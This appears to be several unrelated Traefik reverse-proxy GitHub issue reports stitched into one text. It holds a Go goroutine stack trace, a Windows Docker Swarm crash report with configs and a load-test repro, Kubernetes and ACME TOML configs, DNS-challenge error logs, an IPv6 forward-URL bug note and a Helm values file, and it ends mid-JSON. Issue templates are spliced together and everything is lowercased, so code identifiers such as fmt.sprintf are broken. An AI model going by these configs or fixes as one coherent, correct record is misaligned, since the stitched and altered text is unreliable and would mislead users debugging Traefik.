jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:50 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savefrontend).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/roundrobin.(*roundrobin).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/roundrobin/rr.go:129 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.(*emptybackendhandler).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/empty_backend_handler.go:29 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.wrap.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:41 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.(*handlerswitcher).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/handlerswitcher.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.wrap.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:41 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/thoas/stats.(*stats).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:64 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: net/http.handlerfunc.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1947 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*loghandler).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/logger.go:160 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: net/http.handlerfunc.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1947 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.negronirecoverhandler.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/recover.go:23 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
jun 29 15:17:29 [localhost] traefik: net/http.serverhandler.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2694 +
jun 29 15:17:29 [localhost] traefik: net/http.(*conn).serve( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1830 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*server).serve
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2795 +
jun 29 15:17:29 [localhost] traefik: goroutine 4456539 [runnable]:
jun 29 15:17:29 [localhost] traefik: unicode.isspace( , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/unicode/graphic.go:126 +
jun 29 15:17:29 [localhost] traefik: strings.indexfunc( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/strings/strings.go:723 +
jun 29 15:17:29 [localhost] traefik: strings.trimleftfunc( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/strings/strings.go:680 +
jun 29 15:17:29 [localhost] traefik: strings.trimfunc( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/strings/strings.go:703 +
jun 29 15:17:29 [localhost] traefik: strings.trimspace( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/strings/strings.go:814 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/types.canonicaldomain( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/types/types.go:404 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/rules.(*rules).host.func1( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/rules/rules.go:30 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/mux.matcherfunc.match( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/route.go:311 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/mux.(*route).match( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/route.go:62 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/mux.(*router).match( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:71 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:116 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.(*handlerswitcher).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/handlerswitcher.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.wrap.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:41 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/thoas/stats.(*stats).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:64 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: net/http.handlerfunc.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1947 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*loghandler).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/logger.go:160 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: net/http.handlerfunc.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1947 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.negronirecoverhandler.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/recover.go:23 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
jun 29 15:17:29 [localhost] traefik: net/http.serverhandler.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2694 +
jun 29 15:17:29 [localhost] traefik: net/http.(*conn).serve( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1830 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*server).serve
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2795 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461239 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*connreader).backgroundread( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:668 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*connreader).startbackgroundread
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:664 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461179 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.setrequestcancel.func3( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:323 +
jun 29 15:17:29 [localhost] traefik: created by net/http.setrequestcancel
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:322 +
jun 29 15:17:29 [localhost] traefik: goroutine 4406349 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1822 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: rax
jun 29 15:17:29 [localhost] traefik: rbx
jun 29 15:17:29 [localhost] traefik: rcx
jun 29 15:17:29 [localhost] traefik: rdx
jun 29 15:17:29 [localhost] traefik: rdi
jun 29 15:17:29 [localhost] traefik: rsi
jun 29 15:17:29 [localhost] traefik: rbp
jun 29 15:17:29 [localhost] traefik: rsp
jun 29 15:17:29 [localhost] traefik: r8
jun 29 15:17:29 [localhost] traefik: r9
jun 29 15:17:29 [localhost] traefik: r10
jun 29 15:17:29 [localhost] traefik: r11
jun 29 15:17:29 [localhost] traefik: r12
jun 29 15:17:29 [localhost] traefik: r13
jun 29 15:17:29 [localhost] traefik: r14
jun 29 15:17:29 [localhost] traefik: r15
jun 29 15:17:29 [localhost] traefik: rip
jun 29 15:17:29 [localhost] traefik: rflags
jun 29 15:17:29 [localhost] traefik: cs
jun 29 15:17:29 [localhost] traefik: fs
jun 29 15:17:29 [localhost] traefik: gs
jun 29 15:17:30 [localhost] systemd: traefik.service holdoff time over, scheduling restart.
``` </details>
windows version
microsoft windows [version 10.0.16299.492]
windows server core 1709
docker version
``` version: 17.06.2-ee-13 api version: 1.30 go version: go1.8.7 git commit: ac44d73 built: mon jun 4 16:46:59 2018 os/arch: windows/amd64 server: engine: version: 17.06.2-ee-13 api version: 1.30 (minimum version 1.24) go version: go1.8.7 git commit: ac44d73 built: mon jun 4 16:58:47 2018 os/arch: windows/amd64 experimental: false
docker daemon.json
{ "fixed-cidr": "192.168.1.254/24", "hosts": [ "tcp://0.0.0.0:2375", "npipe://" ]
``` traefik dockerfile, based on
```dockerfile
from microsoft/windowsservercore:1709 as core
from microsoft/nanoserver:1709
copy --from=core /windows/system32/netapi32.dll /windows/system32/netapi32.dll env traefik_version 1.6.4 add {traefik_version}/traefik_windows-amd64.exe /traefik.exe volume c:/etc/traefik
volume c:/etc/ssl expose 80
entrypoint ["/traefik", "--configfile=c:/etc/traefik/traefik.toml"] # metadata
label org.label-schema.vendor="containous" \\ org.label-schema.url=" " \\ org.label-schema.name="traefik" \\ org.label-schema.description="a modern reverse-proxy" \\ org.label-schema.version="v${traefik_version}" \\ org.label-schema.docker.schema-version="1.0"
``` docker-compose.yml
version: \'3.3\' services: traefik: image: ivanjosipovic/public:traefik-v1.6.4-1709 command: - "--loglevel=debug" - "--docker" - "--docker.domain=docker.local" - "--docker.endpoint=tcp://192.168.1.1:2375" - "--docker.swarmmode" - "--docker.watch" - "--docker.exposedbydefault=false" - "--entrypoints=name:http address::80" - "--defaultentrypoints=http" ports: - target: 80 published: 80 mode: host webapp: image: microsoft/dotnet-samples:aspnetapp-nanoserver-1709 depends_on: - traefik deploy: endpoint_mode: dnsrr labels: - "traefik.enable=true" - "traefik.port=80" - "traefik.frontend.rule=host:tst-app.com" - "traefik.backend.loadbalancer.method=drr" - "traefik.docker.network: traefik" ports: - target: 80 published: 8080 mode: host networks: default: external: name: traefik
``` ### repro steps #### on docker host:
install windows server core 1709 ```
install-module dockermsftprovider -force
install-package docker -providername dockermsftprovider -force
``` copy `daemon.json` above to `c:\\programdata\\docker\\config` ```
start-service docker
docker swarm init
docker network create --driver=overlay traefik
docker stack deploy --compose-file docker-compose.yml --prune base
```` #### on a remote machine: add a entry to the hosts file for, {docker host ip } tst-app.com download bombardier,
.\\bombardier-windows-amd64.exe -c 100 -n 5000
``` once this is complete, try loading the site through a browser, it will not work.
however, if you try this will work as it bypasses traefik ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) log is too large to paste here, a zip can be grabbed here,
```toml defaultentrypoints = ["http", "https"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.https] address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/etc/traefikssl/1_bxr.eduwxt.com_bundle.crt" keyfile = "/etc/traefikssl/2_bxr.eduwxt.com.key" [entrypoints.secure] address = ":8443" [entrypoints.secure.tls] [entrypoints.secure.tls.clientca] files = ["/etc/traefikssl/clientca.crt"] optional = false [[entrypoints.secure.tls.certificates]] certfile = "/etc/traefikssl/bxr.cn.crt" keyfile = "/etc/traefikssl/bxr.cn.key" [accesslog] filepath = "/accesslog/access.log" format = "json" [metrics] [metrics.prometheus] entrypoint = "traefik" buckets=[0.1,0.3,1.2,5.0]
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ``` ```
# original config pre-upgrade # traefik.toml loglevel = "info" defaultentrypoints = ["http","https"] [entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.http.redirect] regex = "^ " replacement = " " [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/ssl/tls.crt" keyfile = "/ssl/tls.key" [kubernetes] # config post-upgrade simply added this to kubernetes section: [kubernetes.ingressendpoint] publishedservice = "default/ingress-controller-traefik"
``` running on kubernetes 1.9.5 on bare metal
### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ``` ```
defaultentrypoints = ["http", "https"] [acme] email = "..." entrypoint = "https" onhostrule = true storage = "acme.json" [acme.dnschallenge] delaybeforecheck = 0 provider = "cloudflare" [[acme.domains]] main = "*.mydomain.com" sans = ["mydomain.com"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [web] address = ":8080" [web.auth.basic] users = ["..."]
``` the environment has cloudflare email and cloudflare api key in it
when i set the wildcard subdomains to be their own `main` entry and the domain to be its own `main` entry, it works without error.
caserver = " " [acme.dnschallenge] provider = "gandiv5" delaybeforecheck = 0
[[acme.domains]] main = "*.example.org" sans = ["example.org"] [[acme.domains]] main = "*.example.guru" sans = ["example.guru"] [[acme.domains]] main = "service.example.com"
```
the results are the same using: ```toml
caserver = " "
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
6/6/2018 11:31:34 amgandi dns: zone record deleted
6/6/2018 11:31:34 amerro[2018-06-06t09:31:34z] unable to obtain acme certificate for domains "service.example.com" : cannot obtain certificates: acme: error -> one or more domains had a problem:
6/6/2018 11:31:34 am[service.example.com] acme: error 400 - urn:ietf:params:acme:error:dns - dns problem: nxdomain looking up txt for _acme-challenge.service.example.com
6/6/2018 11:31:34 am
6/6/2018 11:32:01 amgandi dns: zone record deleted
6/6/2018 11:32:01 amerro[2018-06-06t09:32:01z] unable to obtain acme certificate for domains "*.example.guru,example.guru" : cannot obtain certificates: acme: error -> one or more domains had a problem:
6/6/2018 11:32:01 am[example.guru] acme: error 403 - urn:ietf:params:acme:error:unauthorized - no txt record found at _acme-challenge.example.guru
6/6/2018 11:32:01 am
6/6/2018 11:32:35 amgandi dns: zone record deleted
6/6/2018 11:32:36 amgandi dns: dns record created
6/6/2018 11:33:21 amgandi dns: zone record deleted
6/6/2018 11:33:21 amerro[2018-06-06t09:33:21z] unable to obtain acme certificate for domains "*.example.org,example.org" : cannot obtain certificates: acme: error -> one or more domains had a problem:
6/6/2018 11:33:21 am[example.org] acme: error 403 - urn:ietf:params:acme:error:unauthorized - incorrect txt record "nyhydzd1enyntdy4_eq5bp7vhhtvy5xwkrv_8pf3r2u" found at _acme-challenge.example.org ```
linux ubuntu 16.04 ```toml ``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ``` ```
same as described in the user guide
### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
time="2018-06-02t19:40:54z" level=debug msg="vulcand/oxy/roundrobin/rr: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate\\"],\\"accept-language\\":[\\"de-de,de;q=0.9,en-us;q=0.8,en;q=0.7\\"],\\"cache-control\\":[\\"max-age=0\\"],\\"connection\\":[\\"keep-alive\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (macintosh; intel mac os x 10_13_4) applewebkit/537.36 (khtml, like gecko) chrome/66.0.3359.181 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"replaced.example.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"[2001:(replaced):5cc8:8e7]:53130\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-06-02t19:40:54z" level=debug msg="vulcand/oxy/roundrobin/rr: forwarding this request to url" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate\\"],\\"accept-language\\":[\\"de-de,de;q=0.9,en-us;q=0.8,en;q=0.7\\"],\\"cache-control\\":[\\"max-age=0\\"],\\"connection\\":[\\"keep-alive\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (macintosh; intel mac os x 10_13_4) applewebkit/537.36 (khtml, like gecko) chrome/66.0.3359.181 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"replaced.example.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"[2001:(replaced):5cc8:8e7]:53130\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}" forwardurl=" "
there is a problem with the `forwardurl` which is not correct for ipv6
the url part should be of the format by `[address]:port`.
in a quick test i replaced the [line 322]( #l322) with
url := fmt.sprintf("%s://[%s]:%d", protocol, address.ip, endpointport)
with this change everything worked for me
for sure this wouldn't work in an ipv4 setup.
to fix this issue one could probably make use of [net.joinhostport]( #joinhostport).
helm chart values.yaml
ssl: enabled: true enforced: false insecureskipverify: false
acme: enabled: true email: email@domain.com staging: true logging: true challengetype: http-01 persistence: enabled: true annotations: {} storageclass: "local-storage" accessmode: readwriteonce size: 1gi
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```json
time="2018-05-31t06:36:40z" level=info msg="using toml configuration file /config/traefik.toml"
time="2018-05-31t06:36:40z" level=warning msg="web provider configuration is deprecated, you should use these options : api, rest provider, ping and metrics"
time="2018-05-31t06:36:40z" level=info msg="traefik version v1.6.2 built on 2018-05-22_03:19:06pm"
time="2018-05-31t06:36:40z" level=info msg="\ stats collection is disabled.\ help us improve traefik by turning this feature on :)\ more details on: #collected-data\ "
time="2018-05-31t06:36:40z" level=debug msg="global configuration loaded {\\"lifecycle\\":{\\"requestacceptgracetimeout\\":0,\\"gracetimeout\\":10000000000},\\"gracetimeout\\":0,\\"debug\\":true,\\"checknewversion\\":true,\\"sendanonymoususage\\":false,\\"accesslogsfile\\":\\"\\",\\"accesslog\\":null,\\"traefiklogsfile\\":\\"\\",\\"traefiklog\\":null,\\"tracing\\":null,\\"loglevel\\":\\"debug\\",\\"entrypoints\\":{\\"http\\":{\\"address\\":\\":80\\",\\"tls\\":null,\\"redirect\\":{\\"regex\\":\\"^ ",\\"replacement\\":\\" "},\\"auth\\":null,\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":true,\\"proxyprotocol\\":null,\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}},\\"https\\":{\\"address\\":\\":443\\",\\"tls\\":{\\"minversion\\":\\"\\",\\"ciphersuites\\":null,\\"certificates\\":[{\\"certfile\\":\\"/ssl/tls.crt\\",\\"keyfile\\":\\"/ssl/tls.key\\"}],\\"clientcafiles\\":null,\\"clientca\\":{\\"files\\":null,\\"optional\\":false}},\\"redirect\\":null,\\"auth\\":null,\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":true,\\"proxyprotocol\\":null,\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}},\\"traefik\\":{\\"address\\":\\":8080\\",\\"tls\\":null,\\"redirect\\":null,\\"auth\\":null,\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":false,\\"proxyprotocol\\":null,\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}}},\\"cluster\\":null,\\"constraints\\":[],\\"acme\\":null,\\"defaultentrypoints\\":[\\"http\\",\\"https\\"],\\"providersthrottleduration\\":2000000000,\\"maxidleconnsperhost\\":200,\\"idletimeout\\":0,\\"insecureskipverify\\":false,\\"rootcas\\":null,\\"retry\\":null,\\"healthcheck\\":{\\"interval\\":30000000000},\\"respondingtimeouts\\":null,\\"forwardingtimeouts\\":null,\\"allowminweightzero\\":false,\\"web\\":{\\"address\\":\\":8080\\",\\"certfile\\":\\"\\",\\"keyfile\\":\\"\\",\\"readonly\\":false,\\"statistics\\":null,\\"metrics\\":null,\\"path\\":\\"/\\",\\"auth\\":null,\\"debug\\":false},\\"docker\\":null,\\"file\\":null,\\"marathon\\":null,\\"consul\\":null,\\"consulcatalog\\":null,\\"etcd\\":null,\\"zookeeper\\":null,\\"boltdb\\":null,\\"kubernetes\\":{\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":[],\\"trace\\":false,\\"templateversion\\":0,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"\\",\\"token\\":\\"\\",\\"certauthfilepath\\":\\"\\",\\"disablepasshostheaders\\":false,\